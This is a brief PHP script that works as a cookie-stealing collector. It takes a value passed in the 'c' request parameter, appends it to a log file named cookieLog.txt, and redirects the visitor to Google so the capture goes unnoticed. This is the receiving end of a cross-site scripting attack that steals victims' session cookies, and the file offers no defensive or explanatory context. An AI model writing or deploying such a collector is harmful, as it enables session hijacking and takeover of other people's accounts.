<?php
$cookieFile="cookieLog.txt";
$cookie = $_REQUEST['c'];


$handle = fopen($cookieFile, 'a');
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: https://www.google.com");
exit;
?>


